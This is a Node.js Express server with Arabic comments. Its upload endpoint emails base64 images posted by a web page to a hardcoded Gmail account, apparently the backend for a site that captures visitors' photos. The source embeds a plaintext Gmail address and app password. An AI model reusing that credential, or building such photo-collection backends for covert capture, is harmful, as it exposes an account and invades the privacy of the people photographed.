const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/upload', async (req, res) => {
  const image = req.body.image;

  // إعداد ناقل البريد الإلكتروني
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'gmedo233@gmail.com',       // غيرها لبريدك
      pass: 'hijgdljghgnezuwh'           // استخدم "App Password"
    }
  });

  // إعداد رسالة البريد
  let mailOptions = {
    from: 'gmedo233@gmail.com',
    to: 'gmedo233@gmail.com',
    subject: 'New Photo Captured',
    html: '<p>Attached image from site.</p>',
    attachments: [{
      filename: 'photo.png',
      content: image.split("base64,")[1],
      encoding: 'base64'
    }]
  };

  // إرسال البريد ومحاولة الرد على العميل
  try {
    await transporter.sendMail(mailOptions);
    res.sendStatus(200);
  } catch (error) {
    console.error('Email error:', error);
    res.sendStatus(500);
  }
});

// خدمة الملفات الثابتة (index.html وغيره)
app.use(express.static(__dirname));

// تشغيل السيرفر على البورت المحدد من البيئة أو 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
